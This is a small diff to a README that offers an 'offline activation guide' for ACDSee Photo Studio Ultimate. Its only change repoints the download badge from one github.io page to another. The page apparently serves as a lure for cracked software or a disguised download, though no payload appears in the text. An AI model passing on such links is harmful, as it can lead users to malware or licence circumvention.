@@ -2,7 +2,7 @@
 
 This repository provides a verified **offline activation guide** for **ACDSee Photo Studio Ultimate** — optimized for air-gapped systems, enterprise use, or no-internet environments.
 
-[![Download Activation Guide](https://img.shields.io/badge/Download-Activation_Guide-blueviolet)](https://acdsee-photo-studio-ultimate-download.github.io/.github)
+[![Download Activation Guide](https://img.shields.io/badge/Download-Activation_Guide-blueviolet)](https://matookfj.github.io/.github/acdsee)
 
 ---
 
